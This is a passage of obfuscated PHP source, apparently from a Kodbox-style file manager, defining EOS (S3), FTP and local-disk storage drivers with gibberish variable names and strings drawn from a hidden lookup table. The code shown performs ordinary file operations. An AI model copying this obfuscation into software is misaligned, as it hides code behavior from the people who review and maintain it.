<?php
 goto A–ÒÉëË©õ; DÌ†ÖÀÆ½Ã: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ÁàÔ½›) { parent::__construct($ÁàÔ½›); $this->signatureVersion($_SERVER[ Ö‘ñÄ”][216]); } public function uploadFormData($û¢Š‘ØÄ, $ÈšÙ¡ö = 3600) { $²ıŠº¼® =& $_SERVER[ Ö‘ñÄ”]; $êÇ„Û¸¼ = $²ıŠº¼®[198]; $çÍ¹‡§Ü = $²ıŠº¼®[1352]; $Ù‘ÂÏƒ = $²ıŠº¼®[62]; $¢Ò®Î¥ = gmdate($²ıŠº¼®[1353]); $ó‹ùİŠê = gmdate($²ıŠº¼®[764]); $œäÒ¿²ä = $²ıŠº¼®[1354]; $ÙªÌÃñÊ = $ÈšÙ¡ö . $²ıŠº¼®[12]; $Âî‚ĞË = $²ıŠº¼®[1316]; $“‘Áêáà = array($this->accessKey, $ó‹ùİŠê, $this->region, $Ù‘ÂÏƒ, $œäÒ¿²ä); $ØÃŠµ® = implode($²ıŠº¼®[8], $“‘Áêáà); $Î—Åëä = array($²ıŠº¼®[1318] => gmdate($²ıŠº¼®[1317], strtotime($²ıŠº¼®[1355])), $²ıŠº¼®[1319] => array(array($²ıŠº¼®[1321] => $this->bucket), array($²ıŠº¼®[1320] => $êÇ„Û¸¼), array($²ıŠº¼®[1322], $²ıŠº¼®[1323], $²ıŠº¼®[12]), array($²ıŠº¼®[1322], $²ıŠº¼®[1356], $²ıŠº¼®[12]), array($²ıŠº¼®[1322], $²ıŠº¼®[1357], $²ıŠº¼®[12]), array($²ıŠº¼®[1324] => $Âî‚ĞË), array($²ıŠº¼®[1358] => $ØÃŠµ®), array($²ıŠº¼®[1359] => $çÍ¹‡§Ü), array($²ıŠº¼®[1360] => $¢Ò®Î¥), array($²ıŠº¼®[1361] => $ÙªÌÃñÊ))); $àªÈïœ² = base64_encode(json_encode($Î—Åëä)); $×—ËÉÀú = hash_hmac($²ıŠº¼®[1362], $ó‹ùİŠê, $²ıŠº¼®[1363] . $this->secret, !0); $µŸÕßä = hash_hmac($²ıŠº¼®[1362], $this->region, $×—ËÉÀú, !0); $–ôíÍ¯æ = hash_hmac($²ıŠº¼®[1362], $Ù‘ÂÏƒ, $µŸÕßä, !0); $Ñçİìğæ = hash_hmac($²ıŠº¼®[1362], $œäÒ¿²ä, $–ôíÍ¯æ, !0); $ç°ÍĞŒ¨ = hash_hmac($²ıŠº¼®[1362], $àªÈïœ², $Ñçİìğæ); $™íçıúÉ = array($²ıŠº¼®[215] => $²ıŠº¼®[12], $²ıŠº¼®[1364] => $²ıŠº¼®[12], $²ıŠº¼®[1320] => $êÇ„Û¸¼, $²ıŠº¼®[1324] => $Âî‚ĞË, $²ıŠº¼®[1328] => $àªÈïœ², $²ıŠº¼®[1365] => $ØÃŠµ®, $²ıŠº¼®[1366] => $çÍ¹‡§Ü, $²ıŠº¼®[1367] => $¢Ò®Î¥, $²ıŠº¼®[1368] => $ÙªÌÃñÊ, $²ıŠº¼®[1369] => $ç°ÍĞŒ¨, $²ıŠº¼®[181] => $this->getHost()); return $™íçıúÉ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($ÖÌâœ¡ï) { parent::__construct(); if (count($ÖÌâœ¡ï) > 0) { $this->_init($ÖÌâœ¡ï); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($õ­íš‡Â) { $”‚±÷¾§ =& $_SERVER[ Ö‘ñÄ”]; global $config; $this->appCharset = $config[$”‚±÷¾§[1370]]; $this->systemCharset = $config[$”‚±÷¾§[1371]]; if (isset($õ­íš‡Â[$”‚±÷¾§[1372]]) && $õ­íš‡Â[$”‚±÷¾§[1372]]) { $this->systemCharset = $õ­íš‡Â[$”‚±÷¾§[1372]]; } } public function iconvApp($²ÕğŸ¬¸) { return $this->iconvTo($²ÕğŸ¬¸, $this->systemCharset, $this->appCharset); } public function iconvSystem($Ç…¡â¾ ) { return $this->iconvTo($Ç…¡â¾ , $this->appCharset, $this->systemCharset); } public function getPathOuter($˜ŞÅŞ©) { $×ÒëÆëÖ =& $_SERVER[ Ö‘ñÄ”]; $´ô¦ ¨ = $this->iconvApp($this->pathBase); $˜ŞÅŞ© = $this->iconvApp($˜ŞÅŞ©); if (substr($´ô¦ ¨, 0, 2) == $×ÒëÆëÖ[1373]) { $´ô¦ ¨ = BASIC_PATH . substr($´ô¦ ¨, 2); } if (substr($˜ŞÅŞ©, 0, 2) == $×ÒëÆëÖ[1373]) { $˜ŞÅŞ© = BASIC_PATH . substr($˜ŞÅŞ©, 2); } $´ô¦ ¨ = KodIO::clear($´ô¦ ¨); $˜ŞÅŞ© = KodIO::clear($˜ŞÅŞ©); $˜ŞÅŞ© = substr($˜ŞÅŞ©, strlen($´ô¦ ¨)); if (empty($this->pathDriver)) { return $˜ŞÅŞ©; } return $this->pathDriver . $×ÒëÆëÖ[8] . ltrim($˜ŞÅŞ©, $×ÒëÆëÖ[8]); } private function _init($ÎÍè”ûÁ = array()) { $×™€ˆÓµ =& $_SERVER[ Ö‘ñÄ”]; if (!function_exists($×™€ˆÓµ[1374])) { throw new Exception(LNG($×™€ˆÓµ[1375])); } $this->config = $ÎÍè”ûÁ; $this->charsetReset($ÎÍè”ûÁ); foreach ($ÎÍè”ûÁ as $ªúŸì’Ö => $«‡Œ¹Òñ) { if (isset($this->{$ªúŸì’Ö})) { $this->{$ªúŸì’Ö} = $«‡Œ¹Òñ; } } return $this->_login($ÎÍè”ûÁ); } private function _login($¥°ï¬æ) { $¥şÇ°”÷ =& $_SERVER[ Ö‘ñÄ”]; static $Õğ…ßáÒ = array(); $çÖ‚¡ = md5(json_encode($¥°ï¬æ)); if (isset($Õğ…ßáÒ[$çÖ‚¡])) { foreach ($Õğ…ßáÒ[$çÖ‚¡] as $ˆ€‚šÚî => $…£‚¶³Õ) { $this->{$ˆ€‚šÚî} = $…£‚¶³Õ; } return !0; } $àœ‚’»ë = parse_url(trim($this->server, $¥şÇ°”÷[8])); $this->host = $àœ‚’»ë[$¥şÇ°”÷[181]]; $©éã×ş… = isset($àœ‚’»ë[$¥şÇ°”÷[180]]) && $àœ‚’»ë[$¥şÇ°”÷[180]] == $¥şÇ°”÷[1376] ? !0 : !1; $this->scheme = $©éã×ş… ? $¥şÇ°”÷[1377] : $¥şÇ°”÷[1378]; $this->port = isset($àœ‚’»ë[$¥şÇ°”÷[182]]) ? $àœ‚’»ë[$¥şÇ°”÷[182]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ôö¸¦Š = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $¥Ò·¹¾ = $this->pasv == $¥şÇ°”÷[88] ? !0 : !1; @ftp_pasv($this->connect, $¥Ò·¹¾); $Õğ…ßáÒ[$çÖ‚¡] = array($¥şÇ°”÷[1379] => $this->connect, $¥şÇ°”÷[181] => $this->host, $¥şÇ°”÷[180] => $this->scheme, $¥şÇ°”÷[182] => $this->port); return $ôö¸¦Š; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($ıèæØæ·, $×‰ë¯´ = '', $í‰Ÿ§§ğ = REPEAT_RENAME) { if ($this->setContent($ıèæØæ·, $×‰ë¯´)) { return $this->getPathOuter($ıèæØæ·); } return !1; } public function mkdir($€õ´Ëê®, $ºÃ½Ö«ˆ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $€õ´Ëê® = $this->iconvSystem($€õ´Ëê®); if ($this->_isFolder($€õ´Ëê®) || @ftp_mkdir($this->connect, $€õ´Ëê®)) { return $this->getPathOuter($€õ´Ëê®); } if (!$this->mkdir($this->pathFather($€õ´Ëê®))) { return !1; } if ($€õ´Ëê® = @ftp_mkdir($this->connect, $€õ´Ëê®)) { return $this->getPathOuter($€õ´Ëê®); } return !1; } public function copyFile($©áÃî±¸, $µ”êğÔ‡) { if (!$this->_isconn()) { return !1; } $¿ŠÅ§»Î = $this->pathThis($this->iconvSystem($©áÃî±¸)); $ø¤ë„´ = $this->tempFile($¿ŠÅ§»Î); $¨Ğ “÷Â = $this->iconvApp($ø¤ë„´); $this->download($©áÃî±¸, $¨Ğ “÷Â); $ãôêÊĞÜ = $this->upload($µ”êğÔ‡, $¨Ğ “÷Â); $this->tempFileRemve($ø¤ë„´); return $ãôêÊĞÜ; } public function moveFile($‡ôõÀæá, $­ö”í) { if (!$this->_isconn()) { return !1; } $‡ôõÀæá = $this->iconvSystem($‡ôõÀæá); $­ö”í = $this->iconvSystem($­ö”í); $Â²ªÃğ = @ftp_rename($this->connect, $‡ôõÀæá, $­ö”í); return $Â²ªÃğ ? $this->getPathOuter($­ö”í) : !1; } public function delFile($ôÈˆÎ‰°) { if (!$this->_isconn()) { return !1; } $ôÈˆÎ‰° = $this->iconvSystem($ôÈˆÎ‰°); return @ftp_delete($this->connect, $ôÈˆÎ‰°); } public function delFolder($ØùøÇ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $±³Õ—é† = $Ì”¦Ê££ = array(); $this->fileList($ØùøÇ, $±³Õ—é†, $Ì”¦Ê££, !0); $this->listItemCache = !0; foreach ($Ì”¦Ê££ as $¹Å‘ãï) { $Ô¤ı»–² = $this->iconvSystem($¹Å‘ãï[$_SERVER[ Ö‘ñÄ”][32]]); $Ò‰ŸÆğÆ = @ftp_delete($this->connect, $Ô¤ı»–²); if (!$Ò‰ŸÆğÆ) { return !1; } } foreach ($±³Õ—é† as $Ô¤ı»–²) { $Ô¤ı»–² = $this->iconvSystem($Ô¤ı»–²); $Ò‰ŸÆğÆ = @ftp_rmdir($this->connect, $Ô¤ı»–²); if (!$Ò‰ŸÆğÆ) { return !1; } } $ØùøÇ = $this->iconvSystem($ØùøÇ); return @ftp_rmdir($this->connect, $ØùøÇ); } public function rename($•¾á Í, $Æ¬Œ­¬Ã) { $¡úæÛïª =& $_SERVER[ Ö‘ñÄ”]; if (!$this->_isconn()) { return !1; } $ÀÏéèµğ = $this->fileNameAuto($this->pathFather($•¾á Í), $Æ¬Œ­¬Ã); $ÀÏéèµğ = $this->iconvSystem($ÀÏéèµğ); $•¾á Í = $this->iconvSystem($•¾á Í); $º«Ùèô¤ = $this->pathFather($•¾á Í); $·ªŞÌ‰ = rtrim($º«Ùèô¤, $¡úæÛïª[8]) . $¡úæÛïª[8] . $ÀÏéèµğ; $Ã“ÅÀ¿’ = @ftp_rename($this->connect, $•¾á Í, $·ªŞÌ‰); $·ªŞÌ‰ = $this->iconvApp($·ªŞÌ‰); return $Ã“ÅÀ¿’ ? $this->getPathOuter($·ªŞÌ‰) : !1; } private function folderInfo($Óá˜–î, $ßºëÀ°† = false) { $ğ«†Âç© =& $_SERVER[ Ö‘ñÄ”]; $Â‰×’÷Ñ = array($ğ«†Âç©[32] => $this->pathThis($Óá˜–î), $ğ«†Âç©[84] => $this->getPathOuter($ğ«†Âç©[8] . $Óá˜–î), $ğ«†Âç©[33] => $ğ«†Âç©[75]); if ($ßºëÀ°†) { return $Â‰×’÷Ñ; } $Â‰×’÷Ñ[$ğ«†Âç©[200]] = $Â‰×’÷Ñ[$ğ«†Âç©[85]] = 0; $Â‰×’÷Ñ[$ğ«†Âç©[201]] = $Â‰×’÷Ñ[$ğ«†Âç©[202]] = !0; return $Â‰×’÷Ñ; } private function fileInfo($Şò¨‡¢Ì, $¤°»±…Ñ = false, $òïÙã«Õ = array()) { $‚ßÒì¶£ =& $_SERVER[ Ö‘ñÄ”]; $Í™©¹À­ = array($‚ßÒì¶£[32] => $this->pathThis($Şò¨‡¢Ì), $‚ßÒì¶£[84] => $this->getPathOuter($‚ßÒì¶£[8] . $Şò¨‡¢Ì), $‚ßÒì¶£[33] => $‚ßÒì¶£[199], $‚ßÒì¶£[76] => isset($òïÙã«Õ[$‚ßÒì¶£[76]]) ? $òïÙã«Õ[$‚ßÒì¶£[76]] : 0, $‚ßÒì¶£[174] => $this->ext($Şò¨‡¢Ì)); if ($¤°»±…Ñ) { return $Í™©¹À­; } $Í™©¹À­[$‚ßÒì¶£[200]] = $Í™©¹À­[$‚ßÒì¶£[85]] = 0; $Í™©¹À­[$‚ßÒì¶£[201]] = $Í™©¹À­[$‚ßÒì¶£[202]] = !0; $ ‡Ì›Ö = $this->iconvSystem($Şò¨‡¢Ì); $Í™©¹À­[$‚ßÒì¶£[85]] = @ftp_mdtm($this->connect, $ ‡Ì›Ö); if (empty($òïÙã«Õ)) { $òïÙã«Õ = $this->objectMeta($Şò¨‡¢Ì); if (!$òïÙã«Õ) { return $Í™©¹À­; } } $Í™©¹À­[$‚ßÒì¶£[76]] = $òïÙã«Õ[$‚ßÒì¶£[76]]; return $Í™©¹À­; } public function size($÷êÃÍ®Ò) { $Ê•©Ø‡ = $this->objectMeta($÷êÃÍ®Ò); return $Ê•©Ø‡ ? $Ê•©Ø‡[$_SERVER[ Ö‘ñÄ”][76]] : 0; } public function info($¡Æ¥­é³) { if ($this->isFile($¡Æ¥­é³)) { return $this->fileInfo($¡Æ¥­é³, 0); } else { if ($this->isFolder($¡Æ¥­é³)) { return $this->folderInfo($¡Æ¥­é³); } } return !1; } private function fileList($‡¨šŸ—ñ, &$¶şå¡ˆØ, &$ğèËÂ¶·, $êşÄ«µ¦ = false) { $ÃÒÕÁğ =& $_SERVER[ Ö‘ñÄ”]; $‡¨šŸ—ñ = $this->iconvSystem($‡¨šŸ—ñ); if (!$this->isFolder($‡¨šŸ—ñ)) { return !1; } @ftp_chdir($this->connect, $ÃÒÕÁğ[8]); $‡¨šŸ—ñ = rtrim($‡¨šŸ—ñ, $ÃÒÕÁğ[8]) . $ÃÒÕÁğ[8]; check_abort(); $ãŒê´Ú = @ftp_rawlist($this->connect, $‡¨šŸ—ñ); if (!$ãŒê´Ú) { $ãŒê´Ú = array(); } $ ²²£™ = array($ÃÒÕÁğ[10] => 1, $ÃÒÕÁğ[1380] => 1); foreach ($ãŒê´Ú as $İ€Ş›‰œ) { $î—ãº± = $this->_listItem($İ€Ş›‰œ); if ($î—ãº±[0] == $ÃÒÕÁğ[772]) { continue; } $Îä¦Š’í = $î—ãº±[8]; if (empty($Îä¦Š’í) && $Îä¦Š’í !== $ÃÒÕÁğ[197] || isset($ ²²£™[$Îä¦Š’í])) { continue; } $Îä¦Š’í = $this->iconvApp($‡¨šŸ—ñ . ltrim($Îä¦Š’í, $ÃÒÕÁğ[8])); $·ûµÔ¦ü = array($ÃÒÕÁğ[32] => $Îä¦Š’í, $ÃÒÕÁğ[33] => $ÃÒÕÁğ[199], $ÃÒÕÁğ[76] => $î—ãº±[4]); if (substr($İ€Ş›‰œ, 0, 1) == $ÃÒÕÁğ[1381]) { $·ûµÔ¦ü[$ÃÒÕÁğ[33]] = $ÃÒÕÁğ[75]; $·ûµÔ¦ü[$ÃÒÕÁğ[76]] = 0; } $× Å®û = $·ûµÔ¦ü[$ÃÒÕÁğ[33]] == $ÃÒÕÁğ[75] ? !0 : !1; $this->cacheMethodInfoSet($Îä¦Š’í, $× Å®û, $·ûµÔ¦ü); if ($× Å®û) { $¶şå¡ˆØ[] = $Îä¦Š’í; if ($êşÄ«µ¦) { $this->fileList($Îä¦Š’í, $¶şå¡ˆØ, $ğèËÂ¶·, $êşÄ«µ¦); } continue; } $ğèËÂ¶·[] = $·ûµÔ¦ü; } $this->cacheMethodInfoSet($‡¨šŸ—ñ, !0); } private function _listItem($æü³çÀ¹) { if (empty($æü³çÀ¹)) { return array(); } $‹“¹ú = preg_split($_SERVER[ Ö‘ñÄ”][1382], $æü³çÀ¹); if (count($‹“¹ú) <= 9) { return $‹“¹ú; } $‹“¹ú[8] = trim(substr($æü³çÀ¹, strpos($æü³çÀ¹, $‹“¹ú[7]) + strlen($‹“¹ú[7]))); return array_splice($‹“¹ú, 0, 9); } public function listPath($«Œ¥äµÑ, $ë“®ü­¨ = false) { $„„ªÕŞ÷ =& $_SERVER[ Ö‘ñÄ”]; if (!$this->_isconn()) { return !1; } $ãê¼›Û¹ = $£ÀÌúû‹ = array(); $this->fileList($«Œ¥äµÑ, $ãê¼›Û¹, $£ÀÌúû‹); foreach ($ãê¼›Û¹ as $Ó¥×†¢ => $Š†Û°‚) { $ãê¼›Û¹[$Ó¥×†¢] = $this->folderInfo($Š†Û°‚, $ë“®ü­¨); } foreach ($£ÀÌúû‹ as $Ó¥×†¢ => $Š†Û°‚) { $£ÀÌúû‹[$Ó¥×†¢] = $this->fileInfo($Š†Û°‚[$„„ªÕŞ÷[32]], $ë“®ü­¨, $Š†Û°‚); } return array($„„ªÕŞ÷[82] => $ãê¼›Û¹, $„„ªÕŞ÷[83] => $£ÀÌúû‹); } public function has($“×›Ÿ„†, $³á¬ó¤Å = false, $ÉÒŞë° = true) { $ñÑ°§äú =& $_SERVER[ Ö‘ñÄ”]; $™¬ÃÁÚÃ = $¦†˜Ùêä = array(); $ôï¼’ = $³á¬ó¤Å ? !0 : !1; $this->fileList($“×›Ÿ„†, $™¬ÃÁÚÃ, $¦†˜Ùêä, $ôï¼’); if ($³á¬ó¤Å) { return array($ñÑ°§äú[207] => count($¦†˜Ùêä), $ñÑ°§äú[208] => count($™¬ÃÁÚÃ)); } if ($ÉÒŞë°) { if (count($¦†˜Ùêä)) { return !0; } } else { if (count($™¬ÃÁÚÃ)) { return !0; } } return !1; } public function listAll($˜Ô×ª¥—) { $¿Çà»ŸÖ =& $_SERVER[ Ö‘ñÄ”]; if (!$this->_isconn()) { return !1; } $õ×»¬šÉ = $×ü¬¹¦€ = array(); $this->fileList($˜Ô×ª¥—, $õ×»¬šÉ, $×ü¬¹¦€, !0); $ø±›š™ä = array(); foreach ($×ü¬¹¦€ as $ÆŞ–åÚ) { $ø±›š™ä[$ÆŞ–åÚ[$¿Çà»ŸÖ[32]]] = $ÆŞ–åÚ[$¿Çà»ŸÖ[76]]; } foreach ($õ×»¬šÉ as $ÆŞ–åÚ) { if (is_string($ÆŞ–åÚ)) { $ø±›š™ä[$ÆŞ–åÚ] = 0; } } return $this->listAllFiles($˜Ô×ª¥—, array_keys($ø±›š™ä), $ø±›š™ä); } public function getContent($¸çÚØ¨ô) { if (!$this->_isconn()) { return !1; } $¸çÚØ¨ô = $this->iconvSystem($¸çÚØ¨ô); return $this->fileSubstr($¸çÚØ¨ô); } public function setContent($ÑÈç©ä±, $ââİ©Ÿ = '') { if (!$this->_isconn()) { return !1; } $ƒ—äÅË“ = $this->pathThis($this->iconvSystem($ÑÈç©ä±)); $ÈÆÛĞ = $this->tempFile($ƒ—äÅË“); file_put_contents($ÈÆÛĞ, $ââİ©Ÿ); $”‰¿÷ = $this->upload($ÑÈç©ä±, $this->iconvApp($ÈÆÛĞ)); $this->tempFileRemve($ÈÆÛĞ); return $”‰¿÷; } public function fileSubstr($½”Ä˜›°, $çƒí«§Š = 0, $½àßŸç = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($½”Ä˜›°, $çƒí«§Š, $½àßŸç); } private function ftpRequest($‰Ê‹±Ã, $ìÌœ˜¾š = 0, $Şü™éÎ = false) { $‰Ê‹±Ã = $this->iconvSystem($‰Ê‹±Ã); $á¡ùÆëş = $this->scheme . $this->host . $_SERVER[ Ö‘ñÄ”][4] . $this->port; $Áæ£‹¡ = curl_init(); curl_setopt($Áæ£‹¡, CURLOPT_URL, $á¡ùÆëş . $this->pathEncode($‰Ê‹±Ã)); curl_setopt($Áæ£‹¡, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($Şü™éÎ) { $×¹Ñğß± = $ìÌœ˜¾š + $Şü™éÎ - 1; curl_setopt($Áæ£‹¡, CURLOPT_RANGE, "{$ìÌœ˜¾š}\x2d{$×¹Ñğß±}"); } curl_setopt($Áæ£‹¡, CURLOPT_RETURNTRANSFER, 1); $¯÷Ñ»Í³ = curl_exec($Áæ£‹¡); curl_close($Áæ£‹¡); return $¯÷Ñ»Í³; } public function upload($©¡‰ÑŒ, $à×•Ìè, $îƒøĞø = false, $ãÒïõÌë = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($©¡‰ÑŒ))) { return !1; } $©¡‰ÑŒ = $this->iconvSystem($©¡‰ÑŒ); $à×•Ìè = $this->iconvSystem($à×•Ìè); $ëğã¦–ü = ftp_nb_put($this->connect, $©¡‰ÑŒ, $à×•Ìè, FTP_BINARY); while ($ëğã¦–ü == FTP_MOREDATA) { $ëğã¦–ü = ftp_nb_continue($this->connect); } if ($ëğã¦–ü != FTP_FINISHED) { return !1; } return $this->getPathOuter($©¡‰ÑŒ); } public function download($§Û‚Ş‡”, $ó°şä¾¿ = '') { if (!$this->_isconn()) { return !1; } $öˆâì¸ = $this->pathFather($ó°şä¾¿); if (!IO::mkdir($öˆâì¸)) { return !1; } $§Û‚Ş‡” = $this->iconvSystem($§Û‚Ş‡”); $ó°şä¾¿ = $this->iconvSystem($ó°şä¾¿); $îËÊ†àª = ftp_nb_get($this->connect, $ó°şä¾¿, $§Û‚Ş‡”, FTP_BINARY); while ($îËÊ†àª == FTP_MOREDATA) { $îËÊ†àª = ftp_nb_continue($this->connect); } if ($îËÊ†àª != FTP_FINISHED) { return !1; } return $this->iconvApp($ó°şä¾¿); } public function exist($Îé£ø­Ğ) { return $this->isFile($Îé£ø­Ğ) || $this->isFolder($Îé£ø­Ğ); } public function isFile($ÅŸ‚Ôšé) { return !$this->isFolder($ÅŸ‚Ôšé) && $this->objectMeta($ÅŸ‚Ôšé); } public function isFolder($Àºï­„å) { return $this->cacheMethod($_SERVER[ Ö‘ñÄ”][165], $Àºï­„å); } protected function objectMeta($éÃÍªåõ) { return $this->cacheMethod($_SERVER[ Ö‘ñÄ”][167], $éÃÍªåõ); } protected function _objectMeta($Ô¬™ıâ‹) { $íºÅÅíë =& $_SERVER[ Ö‘ñÄ”]; if ($Ô¬™ıâ‹ == $íºÅÅíë[12] || $Ô¬™ıâ‹ == $íºÅÅíë[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Ô¬™ıâ‹ = $this->iconvSystem($Ô¬™ıâ‹); $Èùö¡ = array($íºÅÅíë[32] => $this->iconvApp($Ô¬™ıâ‹), $íºÅÅíë[33] => $íºÅÅíë[199], $íºÅÅíë[76] => 0); @ftp_chdir($this->connect, $íºÅÅíë[8]); $ô¯Ö¸ÂŞ = @ftp_size($this->connect, $Ô¬™ıâ‹); if ($ô¯Ö¸ÂŞ != -1) { $Èùö¡[$íºÅÅíë[76]] = $ô¯Ö¸ÂŞ; } else { $ºúŠ……„ = @ftp_chdir($this->connect, $Ô¬™ıâ‹); if (!$ºúŠ……„) { return !1; } $Èùö¡[$íºÅÅíë[33]] = $íºÅÅíë[75]; } return $Èùö¡; } protected function _isFolder($ÍŞ¼¶±ş) { $Èçººü =& $_SERVER[ Ö‘ñÄ”]; if ($ÍŞ¼¶±ş == $Èçººü[12] || $ÍŞ¼¶±ş == $Èçººü[8]) { return !0; } $¨ğƒÅè» = $this->_objectMeta($ÍŞ¼¶±ş); return isset($¨ğƒÅè»[$Èçººü[33]]) && $¨ğƒÅè»[$Èçººü[33]] == $Èçººü[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($÷Ÿ³Í¤ª) { if (substr($÷Ÿ³Í¤ª, 0, 2) == $_SERVER[ Ö‘ñÄ”][1373]) { $÷Ÿ³Í¤ª = BASIC_PATH . substr($÷Ÿ³Í¤ª, 2); } return $÷Ÿ³Í¤ª; } public function iconvApp($‰ÄÁ·Òæ) { $õéÄÎäò =& $_SERVER[ Ö‘ñÄ”]; global $config; return $this->iconvTo($‰ÄÁ·Òæ, $config[$õéÄÎäò[1371]], $config[$õéÄÎäò[1370]]); } public function iconvSystem($£º×–ß¡) { $ˆÎÑã =& $_SERVER[ Ö‘ñÄ”]; global $config; return $this->iconvTo($£º×–ß¡, $config[$ˆÎÑã[1370]], $config[$ˆÎÑã[1371]]); } public function getPathOuter($€§ã§Õ) { $ë£üâúá =& $_SERVER[ Ö‘ñÄ”]; $İíóå–¯ = $this->iconvApp($this->pathBase); $€§ã§Õ = $this->iconvApp($€§ã§Õ); if (substr($İíóå–¯, 0, 2) == $ë£üâúá[1373]) { $İíóå–¯ = BASIC_PATH . substr($İíóå–¯, 2); } if (substr($€§ã§Õ, 0, 2) == $ë£üâúá[1373]) { $€§ã§Õ = BASIC_PATH . substr($€§ã§Õ, 2); } $İíóå–¯ = KodIO::clear($İíóå–¯); $€§ã§Õ = KodIO::clear($€§ã§Õ); $€§ã§Õ = substr($€§ã§Õ, strlen($İíóå–¯)); if (empty($this->pathDriver)) { return $€§ã§Õ; } return $this->pathDriver . $ë£üâúá[8] . ltrim($€§ã§Õ, $ë£üâúá[8]); } public function mkfile($ÏÇÌÅÁÙ, $¶†§í˜± = '', $ïñŒ‘ÒĞ = REPEAT_RENAME) { $ÏÇÌÅÁÙ = $this->iconvSystem($ÏÇÌÅÁÙ); @touch($ÏÇÌÅÁÙ); if ($¶†§í˜±) { file_put_contents($ÏÇÌÅÁÙ, $¶†§í˜±); } @chmod($ÏÇÌÅÁÙ, $this->pathAuth); return is_file($ÏÇÌÅÁÙ) ? $this->getPathOuter($ÏÇÌÅÁÙ) : !1; } public function mkdir($ş¾Ô¨Ø¢, $¬ùÓÛã = REPEAT_SKIP) { $ş¾Ô¨Ø¢ = $this->iconvSystem($ş¾Ô¨Ø¢); if (is_dir($ş¾Ô¨Ø¢)) { return $this->getPathOuter($ş¾Ô¨Ø¢); } @mkdir($ş¾Ô¨Ø¢, $this->pathAuth, !0); @chmod($ş¾Ô¨Ø¢, $this->pathAuth); return is_dir($ş¾Ô¨Ø¢) ? $this->getPathOuter($ş¾Ô¨Ø¢) : !1; } public function copyFile($Ó¨ğÉèó, $š°ïº£) { $this->mkdir($this->pathFather($š°ïº£)); $Ó¨ğÉèó = $this->iconvSystem($Ó¨ğÉèó); $š°ïº£ = $this->iconvSystem($š°ïº£); $©¨È·¬¹ = copy_64($Ó¨ğÉèó, $š°ïº£); @chmod($š°ïº£, $this->pathAuth); return $©¨È·¬¹ ? $this->getPathOuter($š°ïº£) : !1; } public function moveFile($÷«Å¶ÈÃ, $àû»ûâ…) { $this->mkdir($this->pathFather($àû»ûâ…)); $÷«Å¶ÈÃ = $this->iconvSystem($÷«Å¶ÈÃ); $àû»ûâ… = $this->iconvSystem($àû»ûâ…); $¸šš©§– = intval(@rename($÷«Å¶ÈÃ, $àû»ûâ…)); if (!$¸šš©§–) { if ($¸šš©§– = intval(@copy_64($÷«Å¶ÈÃ, $àû»ûâ…))) { @unlink($÷«Å¶ÈÃ); } } @chmod($àû»ûâ…, $this->pathAuth); return $¸šš©§– ? $this->getPathOuter($àû»ûâ…) : !1; } public function movePath($Á‚ÒÜÕò, $”Ãø’âÆ, $–ßş„ğ = false) { $úš·¶±ã =& $_SERVER[ Ö‘ñÄ”]; $Á‚ÒÜÕò = $this->iconvSystem($Á‚ÒÜÕò); $”Ãø’âÆ = $this->iconvSystem($”Ãø’âÆ); $èÕÖ¶ÓÇ = rtrim($”Ãø’âÆ, $úš·¶±ã[8]) . $úš·¶±ã[8] . ($–ßş„ğ ? $–ßş„ğ : get_path_this($Á‚ÒÜÕò)); if (file_exists($èÕÖ¶ÓÇ)) { return !1; } $ş¸æùÔ = intval(@rename($Á‚ÒÜÕò, $èÕÖ¶ÓÇ)); $ş¸æùÔ = file_exists($èÕÖ¶ÓÇ); return $ş¸æùÔ ? $this->getPathOuter($èÕÖ¶ÓÇ) : !1; } public function delFile($Æ•±„Ç) { $Æ•±„Ç = $this->iconvSystem($Æ•±„Ç); if (!@unlink($Æ•±„Ç)) { @chmod($Æ•±„Ç, $this->pathAuth); if (!@unlink($Æ•±„Ç)) { return !1; } } else { return !0; } } public function delFolder($®±ßô ş) { $”ŒçÇÔİ =& $_SERVER[ Ö‘ñÄ”]; $®±ßô ş = $this->iconvSystem($®±ßô ş); if (!is_dir($®±ßô ş)) { return !0; } if (!($Øé„üçÙ = opendir($®±ßô ş))) { return !1; } while (($ı¦³æŸÙ = readdir($Øé„üçÙ)) !== !1) { if ($ı¦³æŸÙ == $”ŒçÇÔİ[10] || $ı¦³æŸÙ == $”ŒçÇÔİ[1380]) { continue; } $şÚ˜”¦› = $®±ßô ş . $”ŒçÇÔİ[8] . $ı¦³æŸÙ; if (is_file($şÚ˜”¦›) || is_link($şÚ˜”¦›)) { if (!unlink($şÚ˜”¦›)) { chmod($şÚ˜”¦›, $this->pathAuth); if (!unlink($şÚ˜”¦›)) { return !1; } } } else { if (is_dir($şÚ˜”¦›)) { chmod($şÚ˜”¦›, $this->pathAuth); $şÚ˜”¦› = $this->iconvApp($şÚ˜”¦›); if (!$this->delFolder($şÚ˜”¦›)) { return !1; } } } } closedir($Øé„üçÙ); return rmdir($®±ßô ş); } public function rename($½«Ô¼Û·, $ÛßÏ™ÇÃ) { $òÁÀ¾èö =& $_SERVER[ Ö‘ñÄ”]; $”Â³¦ô„ = $this->fileNameAuto($this->pathFather($½«Ô¼Û·), $ÛßÏ™ÇÃ); $”Â³¦ô„ = $this->iconvSystem($”Â³¦ô„); $½«Ô¼Û· = $this->iconvSystem($½«Ô¼Û·); $Ì£¢ú¢± = $this->pathFather($½«Ô¼Û·); $ò¨Ş±ÓÁ = rtrim($Ì£¢ú¢±, $òÁÀ¾èö[8]) . $òÁÀ¾èö[8] . $”Â³¦ô„; 